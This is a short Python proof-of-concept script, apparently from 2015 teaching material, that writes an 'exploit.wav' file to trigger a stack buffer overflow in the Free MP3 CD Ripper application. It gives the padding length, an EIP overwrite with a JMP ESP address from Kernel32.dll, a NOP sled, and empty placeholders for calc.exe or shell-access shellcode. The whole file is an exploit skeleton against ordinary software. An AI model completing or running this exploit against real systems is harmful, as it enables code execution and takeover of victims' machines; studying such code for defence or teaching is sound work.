#!/usr/bin/env python
'''
Author: Chris Duffy
Date: May 2015
Purpose: To provide a means to demonstrate a simple file upload proof of concept related to
         exploiting Free MP3 CD Ripper.
'''
import struct
filename="exploit.wav"
fill ="A"*4112
#eip = struct.pack('<I',0x42424242) # EIP overwrite verfication
eip = struct.pack('<I',0x7C874413) # JMP ESP instruction from Kernel32.dll
nop = "\x90"*16
# Place for calc.exe shellcode
calc = ()
# Place for actual shellcode
shell =()
#exploit = fill + eip + nop + calc #loader for simple proof of concept for shell cdoe
exploit = fill + eip + nop + shell #loader for real shell access
writeFile = open (filename, "w")
writeFile.write(exploit)
writeFile.close()
